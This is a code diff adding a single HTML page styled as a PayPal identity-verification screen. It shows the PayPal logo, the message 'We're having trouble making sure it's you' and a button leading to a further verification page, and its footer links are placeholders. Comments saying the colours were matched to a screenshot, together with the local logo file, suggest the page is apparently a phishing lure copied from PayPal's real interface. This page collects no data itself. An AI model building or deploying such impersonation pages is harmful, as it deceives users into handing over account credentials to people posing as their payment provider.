@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root {
+      --brand-blue: #034FB3;          /* your button blue */
+      --text-color: #111111;
+      --border-color: #e3e3e3;
+      --footer-link-color: #4a4a4a;   /* dark gray like screenshot */
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+        "Helvetica Neue", Arial, sans-serif;
+      color: var(--text-color);
+      display: flex;
+      flex-direction: column;
+      background: #ffffff;
+    }
+
+    .page {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      padding: 24px 24px 0;
+    }
+
+    /* Top logo */
+    .logo {
+      margin-bottom: 32px;
+    }
+
+    .logo img {
+      height: 40px;
+      width: auto;
+      display: block;
+    }
+
+    /* Main message */
+    .headline {
+      max-width: 560px;
+      font-size: 32px;
+      font-weight: 700;
+      line-height: 1.15;
+    }
+
+    /* Button near bottom */
+    .button-bar {
+      padding: 0 24px 40px;
+    }
+
+    /* Mobile: keep CTA visible without scrolling */
+    @media (max-width: 767px) {
+      body {
+        /* reserve space so fixed CTA doesn't cover footer/content */
+        padding-bottom: calc(120px + env(safe-area-inset-bottom, 0px));
+      }
+
+      .button-bar {
+        position: fixed;
+        left: 0;
+        right: 0;
+        bottom: calc(env(safe-area-inset-bottom, 0px) + 16px);
+        padding: 0 24px;
+        z-index: 10;
+      }
+    }
+
+    .primary-btn {
+      display: block;
+      width: 100%;
+      text-align: center;
+      padding: 16px 24px;
+      border-radius: 999px;
+      background: var(--brand-blue);  /* uses #034FB3 */
+      color: #ffffff;                 /* white text */
+      font-size: 18px;
+      font-weight: 600;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .primary-btn:active {
+      transform: translateY(1px);
+    }
+
+    /* Footer */
+    footer {
+      border-top: 1px solid var(--border-color);
+      padding: 16px 24px 24px;
+      font-size: 14px;
+      background: #f7f7f7;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: nowrap;
+      justify-content: center;   /* center the links */
+      align-items: center;
+      gap: 20px;                 /* tighter spacing for mobile */
+    }
+
+    .footer-links a {
+      text-decoration: underline;
+      color: var(--footer-link-color);
+      white-space: nowrap;       /* keeps each label together */
+    }
+
+    @media (min-width: 768px) {
+      .page {
+        padding: 40px 80px 0;
+      }
+
+      .button-bar {
+        padding: 0 80px 40px;
+      }
+
+      footer {
+        padding: 24px 80px;
+      }
+
+      .headline {
+        font-size: 40px;
+      }
+
+      .footer-links {
+        gap: 40px;               /* more breathing room on desktop/tablet */
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <div class="logo">
+      <!-- PayPal logo image -->
+      <img src="paypal-logo.png" alt="PayPal" />
+    </div>
+
+    <h1 class="headline">
+      We’re having trouble<br />
+      making sure it’s you
+    </h1>
+  </main>
+
+  <div class="button-bar">
+    <!-- Sends user to verification.html -->
+    <a href="verification.html?fromTrouble=1" class="primary-btn">Try Another Option</a>
+  </div>
+
+  <footer>
+    <nav class="footer-links">
+      <a href="#">Contact Us</a>
+      <a href="#">Privacy</a>
+      <a href="#">Legal</a>
+      <a href="#">Worldwide</a>
+    </nav>
+  </footer>
+</body>
+</html>
